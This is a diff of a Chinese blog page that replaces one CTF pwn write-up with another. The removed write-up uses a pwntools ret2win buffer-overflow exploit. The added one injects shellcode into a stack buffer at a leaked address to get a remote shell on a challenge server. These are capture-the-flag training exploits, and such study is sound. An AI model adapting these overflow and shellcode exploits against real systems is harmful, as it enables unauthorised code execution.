@@ -157,7 +157,7 @@
                     <article class="post-wrap">
                         <header class="post-header">
                             <h1 class="post-title">
-                                [BugKu]overflowPWN
+                                [XMAN]pwn level1   
                             </h1>
                             
                                 <!--en-->
@@ -167,12 +167,12 @@
                                         「配枪朱丽叶 - 分部。」
                                     </a>
                                     <span class="post-time">
-                                Date: <a href="#">2021-06-28</a>
+                                Date: <a href="#">2021-07-07</a>
                             </span>
                                     <span class="post-readtime">Reading Time:<a
-                                    href="#">0.8
+                                    href="#">0.7
                                     mins</a></span>
-                                    <span class="post-words">words:<a href="#">151</a></span>
+                                    <span class="post-words">words:<a href="#">146</a></span>
                                     
                                         <span class="post-category">
                                 Category:
@@ -186,36 +186,32 @@
                         </header>
                         
                         <div class="post-content">
-                            <p>checksec看了下，四个保护都没有开。<br>
-main中代码如下：</p>
-<pre><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
+                            <p>checksec：</p>
+<pre><code>Arch:     i386-32-little
+RELRO:    Partial RELRO
+Stack:    No canary found
+NX:       NX disabled
+PIE:      No PIE (0x8048000)
+RWX:      Has RWX segments
+</code></pre>
+<p>main函数调用了<code>vulnerable_function()</code>，其内容如下：</p>
+<pre><code class="language-c">ssize_t vulnerable_function()
 {
-  char s; // [rsp+0h] [rbp-30h]
+  char buf; // [esp+0h] [ebp-88h]
 
-  memset(&amp;s, 0, 0x30uLL);
-  setvbuf(stdout, 0LL, 2, 0LL);
-  setvbuf(stdin, 0LL, 1, 0LL);
-  puts(&quot;say something?&quot;);
-  read(0, &amp;s, 0x100uLL);
-  puts(&quot;oh,that's so boring!&quot;);
-  return 0;
+  printf(&quot;What's this:%p?\n&quot;, &amp;buf);
+  return read(0, &amp;buf, 0x100u);
 }
 </code></pre>
-<p>还看到了直接获取flag的get_shell_函数，地址是0x400751：</p>
-<pre><code class="language-c">int get_shell_()
-{
-  puts(&quot;tql~tql~tql~tql~tql~tql~tql&quot;);
-  puts(&quot;this is your flag!&quot;);
-  return system(&quot;cat flag&quot;);
-}
-</code></pre>
-<p>可以利用read函数溢出让返回地址为0x400751，exp如下：</p>
+<p>因为关闭了NX保护，且打印了<code>buf</code>的地址，可以把shellcode写入已知地址的<code>buf</code>变量中，然后计算偏移量，最后利用溢出把地址返回到<code>buf</code>执行shellcode。</p>
 <pre><code class="language-python">from pwn import *
 
-p = remote('114.67.246.176',16081)
-payload = 'a'*0x30+'a'*0x8+p64(0x400751)
-p.sendline(payload)
-p.interactive()
+io = remote('pwn2.jarvisoj.com','9877')
+shell= asm(shellcraft.i386.linux.sh())
+buf_addr =  int(io.recvline()[12:-2],16)
+shell_addr = shell+'a'*(0x88+0x4-len(shell))+p32(buf_addr)
+io.sendline(shell_addr)
+io.interactive()
 </code></pre>
 
                         </div>
@@ -231,7 +227,7 @@ p.interactive()
 
                                             <p class="copyright-item">
                                                 <span>Permalink:</span>
-                                                <span><a href="https://shawr00t.github.io/bugkuoverflowpwn/">https://shawr00t.github.io/bugkuoverflowpwn/</a></span>
+                                                <span><a href="https://shawr00t.github.io/xmanpwn-level1/">https://shawr00t.github.io/xmanpwn-level1/</a></span>
                                             </p>
 
                                             <p class="copyright-item">
@@ -246,9 +242,9 @@ p.interactive()
                                                         <span style="margin-right:15px">
                                                     <i class="post-share"></i>
                                                     <span>Share:</span>
-                                                        <a title="QR Code" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://shawr00t.github.io/bugkuoverflowpwn/"><i class="fa fa-qrcode"></i></a>
-                                                        <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://shawr00t.github.io/bugkuoverflowpwn/&sharesource=qzone&title=[BugKu]overflowPWN&pics=https://shawr00t.github.io/images/avatar.png?v=1626333275922&summary="><i class="fa fa-qq"></i></a>
-                                                        <a title="Weibo" target="_blank" href="https://service.weibo.com/share/share.php?url=https://shawr00t.github.io/bugkuoverflowpwn/&sharesource=weibo&title=[BugKu]overflowPWN + " - " + &pic="https://shawr00t.github.io/images/avatar.png?v=1626333275922 "><i class="fa fa-weibo "></i></a>
+                                                        <a title="QR Code" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://shawr00t.github.io/xmanpwn-level1/"><i class="fa fa-qrcode"></i></a>
+                                                        <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://shawr00t.github.io/xmanpwn-level1/&sharesource=qzone&title=[XMAN]pwn level1   &pics=https://shawr00t.github.io/images/avatar.png?v=1626333275922&summary="><i class="fa fa-qq"></i></a>
+                                                        <a title="Weibo" target="_blank" href="https://service.weibo.com/share/share.php?url=https://shawr00t.github.io/xmanpwn-level1/&sharesource=weibo&title=[XMAN]pwn level1    + " - " + &pic="https://shawr00t.github.io/images/avatar.png?v=1626333275922 "><i class="fa fa-weibo "></i></a>
                                                         
                                                             <div class="reward ">
                                                                 <div class="reward-button ">&yen;
@@ -283,13 +279,13 @@ p.interactive()
                                                                                 <!---->
                                                                                 <section class="post-nav">
                                                                                     
-                                                                                        <a class="prev" rel="prev" href="https://shawr00t.github.io/pwnablekrfd/">
-                                                                                            [pwnable.kr]fd
+                                                                                        <a class="prev" rel="prev" href="https://shawr00t.github.io/buuctfciscn_2019_n_1/">
+                                                                                            [BUUCTF]ciscn_2019_n_1 
                                                                                         </a>
                                                                                         
                                                                                             
-                                                                                                <a class="next" rel="next" href="https://shawr00t.github.io/gong-fang-shi-jie-pwn-level0/">
-                                                                                                    [攻防世界]PWN-level0
+                                                                                                <a class="next" rel="next" href="https://shawr00t.github.io/ctfshowpwn03/">
+                                                                                                    [PWN]ret2libc学习笔记
                                                                                                 </a>
                                                                                                 
                                                                                 </section>
